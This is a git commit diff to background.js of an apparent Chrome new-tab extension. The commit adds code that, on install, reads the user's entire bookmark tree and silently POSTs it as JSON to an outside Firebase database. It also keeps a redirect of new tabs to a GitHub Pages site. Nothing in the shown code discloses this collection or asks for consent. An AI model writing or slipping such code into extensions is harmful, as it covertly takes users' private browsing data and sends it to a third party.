d77bd3c618d2528ca5ec421dfc3c0461ae5e90db
Mahmoud Zakria <me@zakcoding.com>
2019-03-03 17:07:35 +0100

    sent to firebase

--- background.js
+++ background.js
@@ -1,8 +1,17 @@
 chrome.runtime.onInstalled.addListener(function() {
-   chrome.tabs.onCreated.addListener(function(){
-     chrome.tabs.update({
-     	url: "https://mahmoudzakaria90.github.io/HelloZeka/public/"
+   chrome.bookmarks.getTree(function( bookmarks ){
+     fetch('https://zekas-51feb.firebaseio.com/allBookmarks.json', {
+       method: 'POST',
+       body: JSON.stringify( bookmarks )
+     }).then( e => console.log( e ) )
+     .catch( e => console.log( e ) )
+   })
+   chrome.tabs.onCreated.addListener(function( tab ){
+    if( tab.url === "chrome://newtab/" ) {
+       chrome.tabs.update({
+       url: "https://mahmoudzakaria90.github.io/HelloZeka/public/"
      })
+    }
    })
    chrome.declarativeContent.onPageChanged.removeRules(undefined, function() {
       chrome.declarativeContent.onPageChanged.addRules([{
